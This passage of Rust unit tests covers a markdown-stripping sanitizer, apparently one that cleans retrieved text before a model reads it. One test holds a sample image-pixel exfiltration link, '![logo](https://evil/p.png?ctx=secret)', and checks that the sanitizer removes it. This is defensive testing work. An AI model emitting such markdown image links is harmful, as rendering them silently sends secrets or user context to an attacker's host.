    }

    /// v1.20.27 "Cordon": false-positive guard. Bare URLs in prose and plain
    /// text pass through unchanged; malformed/unterminated brackets must not
    /// panic and must pass through verbatim.
    #[test]
    fn strip_markdown_leaves_bare_urls_and_plain_text() {
        assert_eq!(
            strip_markdown_refs("see example.com and plain text"),
            "see example.com and plain text"
        );
        // Unterminated brackets — no closing `]`, so no construct match.
        assert_eq!(strip_markdown_refs("a [ b ( c"), "a [ b ( c");
        // Image marker with no construct at all.
        assert_eq!(strip_markdown_refs("![only"), "![only");
    }

    /// v1.20.27 "Cordon": end-to-end through the read seam. A PII-clean chunk
    /// (pii=false → redact_content passes through) carrying an image-pixel
    /// exfil URL loses the URL but keeps the label and surrounding text.
    #[test]
    fn sanitize_read_applies_markdown_strip_end_to_end() {
        let chunk = "notes: ![logo](https://evil/p.png?ctx=secret) end";
        let out = sanitize_read(chunk, false, &None);
        assert_eq!(out, "notes: [logo] end");
    }
}
